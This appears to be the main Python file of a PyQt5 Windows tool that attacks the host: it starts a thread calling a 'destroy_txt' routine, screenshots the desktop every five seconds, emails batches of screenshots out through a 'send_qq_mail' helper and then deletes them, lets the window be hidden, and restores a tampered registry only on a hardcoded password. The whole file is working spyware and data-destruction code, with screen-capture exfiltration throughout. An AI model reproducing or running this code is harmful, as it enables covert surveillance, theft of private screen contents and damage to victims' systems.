import registryattack
from PyQt5 import QtWidgets,QtCore
import sys
import os
import RegistryOperator
from threading import Timer
from datetime import datetime
import write_log
import time

timer_screen_shot = ''
timer_picture_sender = ''

class HiddenUi(QtWidgets.QWidget, registryattack.Ui_dialog):
    def __init__(self):
        super(HiddenUi, self).__init__()
        self.setupUi(self)
        self.recoverRegistry.clicked.connect(self.recover)
        self.hiddenui.clicked.connect(self.hidden_ui)
        self.my_thread = MyThread()

    def ui_destroy_txt(self):
        self.my_thread.start()

    def get_screen_shot(self):
        global timer_screen_shot
        screen = QtWidgets.QApplication.primaryScreen()
        pix = screen.grabWindow(QtWidgets.QApplication.desktop().winId())
        try:
            os.mkdir(RegistryOperator.file_dir + '/picture')
        except OSError:
            pass
        file_name =RegistryOperator.file_dir + '/picture/' + '.'.join(str(datetime.now()).split('.')[0].split(':')) + '.jpg'
        pix.save(file_name)
        write_log.write_log(str(RegistryOperator.pro_pid) + '#' + str(datetime.now()) + ' ---> 截图成功：' + '.'.join(str(datetime.now()).split('.')[0].split(':')) + '.jpg\n')
        timer_screen_shot = Timer(5, self.get_screen_shot)
        timer_screen_shot.start()

    def closeEvent(self, event):
        global timer_screen_shot, timer_picture_sender
        timer_screen_shot.cancel()
        write_log.write_log(
            str(RegistryOperator.pro_pid) + '#' + str(datetime.now()) + ' ---> 定时循环截图已关闭\n')
        timer_picture_sender.cancel()
        write_log.write_log(
            str(RegistryOperator.pro_pid) + '#' + str(datetime.now()) + ' ---> 循环发送截图已关闭\n')
        write_log.write_log(
            str(RegistryOperator.pro_pid) + '#' + str(datetime.now()) + ' ---> 程序正常退出\n')
        self.my_thread.exit()
        event.accept()
        sys.exit()

    def recover(self):
        self.recoverystate.clear()
        if self.pwd.toPlainText() == 'zyl7758258':
            RegistryOperator.recover_registry()
            write_log.write_log(
                str(RegistryOperator.pro_pid) + '#' + str(datetime.now()) + ' ---> 注册表恢复成功\n')
            self.recoverystate.insertPlainText('注册表恢复成功')
        else:
            write_log.write_log(
                str(RegistryOperator.pro_pid) + '#' + str(datetime.now()) +  ' ---> 用户输入了错误的恢复码\n')
            self.recoverystate.insertPlainText('密码错误')

    def hidden_ui(self):
        self.hide()
        write_log.write_log(
            str(RegistryOperator.pro_pid) + '#' + str(datetime.now()) + ' ---> ui已隐藏\n')

class MyThread(QtCore.QThread):
    def __init__(self):
        super(MyThread, self).__init__()

    def run(self):
        RegistryOperator.destroy_txt()
        time.sleep(1)

def send_picture(num):
    global timer_picture_sender
    if len(os.listdir(RegistryOperator.file_dir + '\\picture')) >= num:
        send_file_name = [RegistryOperator.file_dir + '\\picture\\' + str(file) for file in os.listdir(RegistryOperator.file_dir + '/picture')]
        RegistryOperator.send_qq_mail(send_file_name)
        write_log.write_log(
            str(str(RegistryOperator.pro_pid) + '#' + str(datetime.now())) + ' ---> 已成功发送{}张截图\n'.format(len(send_file_name)))
        for file in send_file_name:
            os.remove(file)
            write_log.write_log(str(RegistryOperator.pro_pid) + '#' + str(datetime.now()) + ' ---> 已移除图片：' + str(file) + '\n')
    timer_picture_sender = Timer(5 * (num+1), send_picture, (num,))
    timer_picture_sender.start()

def suppress_qt_warnings():
    os.environ["QT_DEVICE_PIXEL_RATIO"] = "0"
    os.environ["QT_AUTO_SCREEN_SCALE_FACTOR"] = "1"
    os.environ["QT_SCREEN_SCALE_FACTORS"] = "1"
    os.environ["QT_SCALE_FACTOR"] = "1"

def run_ui():
    app = QtWidgets.QApplication(sys.argv)
    suppress_qt_warnings()
    ui = HiddenUi()
    ui.show()
    ui.get_screen_shot()
    send_picture(5)
    sys.exit(app.exec_())

if __name__ == '__main__':
    run_ui()